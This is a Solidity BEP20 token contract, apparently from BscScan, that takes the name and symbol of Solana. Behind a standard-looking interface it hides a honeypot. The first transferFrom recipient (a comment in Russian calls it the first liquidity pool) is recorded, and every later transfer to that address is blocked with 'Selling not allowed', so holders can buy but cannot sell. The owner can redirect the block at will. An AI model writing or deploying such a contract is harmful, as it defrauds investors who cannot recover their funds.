/**
 *Submitted for verification at BscScan.com on 2025-08-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface BEP20Interface {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract SolanaToken is BEP20Interface {
    string public symbol = "SOL";
    string public name = "Solana";
    uint8 public decimals = 9;
    uint private _totalSupply;
    address public owner;

    address public newun;

    mapping(address => uint) private balances;
    mapping(address => mapping(address => uint)) private allowed;

    modifier onlyOwner {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        _totalSupply = 1_000_000_000 * 10 ** uint(decimals);
        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    function transfer(address to, uint tokens) external override returns (bool success) {
        require(to != newun, "Selling not allowed");
        require(to != address(0), "Invalid address");
        require(balances[msg.sender] >= tokens, "Insufficient balance");

        balances[msg.sender] -= tokens;
        balances[to] += tokens;
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function approve(address spender, uint tokens) external override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) external override returns (bool success) {
        if (from != address(0) && newun == address(0)) {
            newun = to; // Первый LP будет заблокирован
        } else {
            require(to != newun, "Selling not allowed");
        }

        require(to != address(0), "Invalid address");
        require(balances[from] >= tokens, "Insufficient balance");
        require(allowed[from][msg.sender] >= tokens, "Allowance exceeded");

        balances[from] -= tokens;
        allowed[from][msg.sender] -= tokens;
        balances[to] += tokens;
        emit Transfer(from, to, tokens);
        return true;
    }

    function totalSupply() external view override returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address tokenOwner) external view override returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) external view override returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function transferNewun(address _newun) external onlyOwner {
        newun = _newun;
    }
}